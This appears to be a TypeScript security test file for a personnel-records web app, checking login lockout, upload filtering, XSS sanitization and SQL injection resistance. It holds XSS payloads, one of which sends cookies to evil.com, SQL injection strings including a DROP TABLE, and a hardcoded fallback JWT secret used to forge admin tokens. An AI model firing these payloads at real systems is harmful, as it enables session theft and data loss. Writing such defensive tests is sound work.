import assert from 'assert';
import DOMPurify from 'isomorphic-dompurify';
import { SignJWT } from 'jose';
import { prisma } from '../../src/lib/prisma';
import bcrypt from 'bcryptjs';

const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';
const JWT_SECRET = process.env.JWT_SECRET || 'eprofile-super-secret-jwt-key-2026-change-in-production';
const encodedSecret = new TextEncoder().encode(JWT_SECRET);

async function makeToken(id: string, role: string, username: string): Promise<string> {
  return await new SignJWT({ id, role, username })
    .setProtectedHeader({ alg: 'HS256' })
    .setExpirationTime('2h')
    .setIssuedAt()
    .sign(encodedSecret);
}

export async function runSecurityAttacksTests() {
  console.log('\n--- Running Security & Attack Simulation Tests ---');

  const admin = await prisma.personnel.findFirst({
    where: { role: 'SUPER_ADMIN', NOT: [{ id: 'ADMIN' }, { id: 'ALL' }] }
  }) || await prisma.personnel.findFirst({
    where: { role: 'ADMIN', NOT: [{ id: 'ADMIN' }, { id: 'ALL' }] }
  });
  assert.ok(admin, 'Admin must exist in DB');
  const adminToken = await makeToken(admin.id, admin.role, admin.username);

  // 1. Account Lockout & Brute-Force Protection
  {
    const lockoutUsername = `test_lockout_${Date.now()}`;
    const rawPw = 'CorrectPassword123';
    const pwHash = await bcrypt.hash(rawPw, 10);

    const testLockoutUser = await prisma.personnel.create({
      data: {
        badgeNo: `LOCK-${Date.now().toString().slice(-6)}`,
        username: lockoutUsername,
        citizenId: `${Math.floor(1000000000000 + Math.random() * 9000000000000)}`,
        password: pwHash,
        prefix: 'นาย',
        firstName: 'ทดสอบ',
        lastName: 'ล็อกเอาต์',
        position: 'เจ้าหน้าที่',
        department: 'ทดสอบ',
        subDepartment: 'ทดสอบ',
        phone: '0812345678',
        mobile: '0812345678',
        email: 'lockout@test.com',
        role: 'USER',
        failedLoginAttempts: 0,
        mustChangePassword: false,
      },
    });

    try {
      const testIp = `10.0.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 200)}`;
      // Send 4 failed login attempts (return 401)
      for (let i = 1; i <= 4; i++) {
        const res = await fetch(`${BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': testIp,
          },
          body: JSON.stringify({
            username: lockoutUsername,
            password: 'WrongPassword999!',
          }),
        });
        assert.strictEqual(res.status, 401, `Failed attempt #${i} should return 401`);
      }

      // 5th attempt locks the account and returns 403
      const lockTriggerRes = await fetch(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-forwarded-for': testIp,
        },
        body: JSON.stringify({
          username: lockoutUsername,
          password: 'WrongPassword999!',
        }),
      });
      assert.strictEqual(lockTriggerRes.status, 403, '5th attempt must return 403 and lock account');

      // Subsequent attempt while locked also returns 403
      const lockedRes = await fetch(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-forwarded-for': testIp,
        },
        body: JSON.stringify({
          username: lockoutUsername,
          password: 'WrongPassword999!',
        }),
      });
      assert.strictEqual(lockedRes.status, 403, 'Subsequent attempts while locked must return 403');
      const lockData = await lockedRes.json();
      assert.ok(lockData.error.includes('ระงับ') || lockData.error.includes('ล็อก'), 'Lockout message must be returned');

      console.log('✔ Account lockout & brute-force protection verified');
    } finally {
      await prisma.personnel.delete({ where: { id: testLockoutUser.id } }).catch(() => {});
    }
  }

  // 2. Upload Malicious & Oversized Files
  {
    // Test malicious executable / script extensions
    const badExtensions = [
      { filename: 'shell.php', mimetype: 'application/x-php', size: 1024 },
      { filename: 'malware.exe', mimetype: 'application/x-msdownload', size: 1024 },
      { filename: 'attack.sh', mimetype: 'application/x-sh', size: 1024 },
      { filename: 'payload.svg', mimetype: 'image/svg+xml', size: 1024 },
    ];

    for (const file of badExtensions) {
      const res = await fetch(`${BASE_URL}/api/media`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': `auth_token=${adminToken}`,
        },
        body: JSON.stringify({
          filename: file.filename,
          url: `/uploads/${file.filename}`,
          size: file.size,
          mimetype: file.mimetype,
        }),
      });

      assert.strictEqual(
        res.status,
        400,
        `Malicious file upload (${file.filename}) should be rejected with 400 (got ${res.status})`
      );
    }

    // Test oversized file (> 10MB)
    const oversizedRes = await fetch(`${BASE_URL}/api/media`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': `auth_token=${adminToken}`,
      },
      body: JSON.stringify({
        filename: 'large.jpg',
        url: '/uploads/large.jpg',
        size: 15 * 1024 * 1024, // 15MB
        mimetype: 'image/jpeg',
      }),
    });
    assert.strictEqual(oversizedRes.status, 400, 'Oversized file upload (>10MB) must return 400');

    console.log('✔ Malicious file extensions & oversized file rejections verified');
  }

  // 3. XSS Payloads Sanitization
  {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(document.cookie)>',
      '<iframe src="javascript:alert(1)"></iframe>',
      'Normal text <script>fetch("http://evil.com?c="+document.cookie)</script> after text',
    ];

    for (const payload of xssPayloads) {
      const clean = DOMPurify.sanitize(payload);
      assert.ok(!clean.includes('<script'), `Sanitized output must not contain <script>: got "${clean}"`);
      assert.ok(!clean.includes('onerror='), `Sanitized output must not contain onerror: got "${clean}"`);
      assert.ok(!clean.includes('onload='), `Sanitized output must not contain onload: got "${clean}"`);
      assert.ok(!clean.includes('<iframe'), `Sanitized output must not contain <iframe: got "${clean}"`);
    }
    console.log('✔ XSS payloads sanitization verified');
  }

  // 4. SQL & Prisma Injection Scenarios
  {
    const sqliPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE Personnel; --",
      "1' UNION SELECT NULL, NULL, NULL--",
      "\" OR \"\"=\"",
      "admin'--",
    ];

    for (const injection of sqliPayloads) {
      // Try injection in search parameter
      const searchRes = await fetch(`${BASE_URL}/api/personnel?search=${encodeURIComponent(injection)}`, {
        headers: { 'Cookie': `auth_token=${adminToken}` },
      });
      assert.strictEqual(searchRes.status, 200, 'Prisma search with SQL injection payload should return 200 safely');

      // Try injection in login
      const loginRes = await fetch(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-forwarded-for': `10.0.2.${Math.floor(Math.random() * 200)}`,
        },
        body: JSON.stringify({
          username: injection,
          password: injection,
        }),
      });
      assert.ok(loginRes.status === 401 || loginRes.status === 404, `SQL injection in login should fail authentication safely (got ${loginRes.status})`);
    }

    // Verify DB integrity is untouched
    const count = await prisma.personnel.count();
    assert.ok(count > 0, 'Database tables and records must remain intact after SQL injection tests');
    console.log('✔ SQL/Prisma injection resistance verified');
  }

  // 5. Concurrent Requests Handling
  {
    const concurrentRequestsCount = 20;
    const promises = [];

    for (let i = 0; i < concurrentRequestsCount; i++) {
      promises.push(
        fetch(`${BASE_URL}/api/health`).then(res => res.json())
      );
    }

    const results = await Promise.all(promises);
    assert.strictEqual(results.length, concurrentRequestsCount);
    for (const res of results) {
      assert.strictEqual(res.status, 'ok', 'Health status should be ok for all concurrent requests');
      assert.strictEqual(res.db, 'connected', 'Database should remain connected during concurrency');
    }
    console.log(`✔ ${concurrentRequestsCount} concurrent requests handled smoothly`);
  }
}

if (require.main === module) {
  runSecurityAttacksTests()
    .then(() => console.log('\nAll security & attack tests passed successfully!'))
    .catch((err) => {
      console.error('Test failed:', err);
      process.exit(1);
    });
}
